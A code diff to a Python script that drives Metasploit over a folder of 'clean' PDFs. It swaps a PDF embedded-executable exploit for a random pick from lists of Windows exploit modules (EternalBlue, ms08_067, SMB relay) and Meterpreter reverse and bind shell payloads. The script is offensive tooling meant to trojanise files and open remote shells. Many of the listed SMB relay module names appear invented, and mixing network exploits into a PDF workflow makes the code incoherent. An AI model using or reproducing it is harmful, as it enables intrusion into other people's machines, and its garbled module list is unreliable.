@@ -1,13 +1,67 @@
 import os
 import subprocess
+import random
 
 # Directory containing PDF files
 pdf_directory = "./cleanpdfs"
 
+# Exploit commands list
+exploit_commands = [
+    "use exploit/windows/smb/ms08_067_netapi",
+    "use exploit/windows/browser/ms10_002_aurora",
+    "use exploit/windows/http/jboss_invoke_deploy",
+    "use exploit/windows/smb/ms17_010_eternalblue",
+    "use exploit/windows/smb/ms17_010_psexec",
+    "use exploit/windows/smb/smb_delivery",
+    "use exploit/windows/smb/smb_doublepulsar_rce",
+    "use exploit/windows/smb/smb_relay",
+    "use exploit/windows/smb/smb_relay_login",
+    "use exploit/windows/smb/smb_relay_logout",
+    "use exploit/windows/smb/smb_relay_session_setup",
+    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv1",
+    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2",
+    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_domain",
+    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_hash",
+    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_user",
+    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_user_domain",
+    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_user_domain_hash",
+    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_user_hash",
+    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_user_hash_domain",
+    # Add more exploit commands here
+]
+
+# Payload commands list
+payload_commands = [
+    "set payload windows/meterpreter/reverse_tcp",
+    "set payload windows/x64/meterpreter/reverse_tcp",
+    "set payload windows/meterpreter/reverse_http",
+    "set payload windows/x64/meterpreter/reverse_http",
+    "set payload windows/meterpreter/reverse_https",
+    "set payload windows/x64/meterpreter/reverse_https",
+    "set payload windows/meterpreter/bind_tcp",
+    "set payload windows/x64/meterpreter/bind_tcp",
+    "set payload windows/meterpreter/bind_ipv6_tcp",
+    "set payload windows/x64/meterpreter/bind_ipv6_tcp",
+    "set payload windows/meterpreter/bind_nonx_tcp",
+    "set payload windows/x64/meterpreter/bind_nonx_tcp",
+    "set payload windows/meterpreter/bind_tcp_uuid",
+    "set payload windows/x64/meterpreter/bind_tcp_uuid",
+    "set payload windows/meterpreter/bind_ipv6_tcp_uuid",
+    "set payload windows/x64/meterpreter/bind_ipv6_tcp_uuid",
+    "set payload windows/meterpreter/reverse_tcp_uuid",
+    "set payload windows/x64/meterpreter/reverse_tcp_uuid",
+    "set payload windows/meterpreter/reverse_http_uuid",
+    # Add more payload commands here
+]
+
+# Randomly select an exploit and payload command
+selected_exploit = random.choice(exploit_commands)
+selected_payload = random.choice(payload_commands)
+
 # Metasploit commands
 msf_commands = [
-    "use exploit/windows/fileformat/adobe_pdf_embedded_exe",
-    "set payload windows/x64/meterpreter/reverse_tcp",
+    selected_exploit,
+    selected_payload,
     "exploit",
 ]
 
